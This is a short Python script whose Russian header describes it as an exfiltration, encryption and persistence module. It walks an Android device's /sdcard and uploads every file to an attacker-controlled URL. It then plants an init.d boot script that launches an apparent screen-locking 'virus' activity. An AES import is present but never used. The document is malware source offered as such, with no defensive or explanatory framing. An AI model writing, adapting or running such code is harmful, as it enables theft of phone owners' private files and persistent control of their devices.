# Python-модуль: эксфильтрация, шифрование, персистентность
import os, requests
from Crypto.Cipher import AES

URL = "http://attacker.local/upload"

def exfil():
    for root, _, files in os.walk("/sdcard"):
        for f in files:
            try:
                p = os.path.join(root, f)
                requests.post(URL, files={"f": open(p, "rb")})
            except Exception:
                pass

def persist():
    try:
        with open("/system/etc/init.d/99py", "w") as f:
            f.write("#!/system/bin/sh\nam start -n com.real.virus/.LockActivity\n")
        os.chmod("/system/etc/init.d/99py", 0o755)
    except Exception:
        pass

if __name__ == "__main__":
    exfil()
    persist()
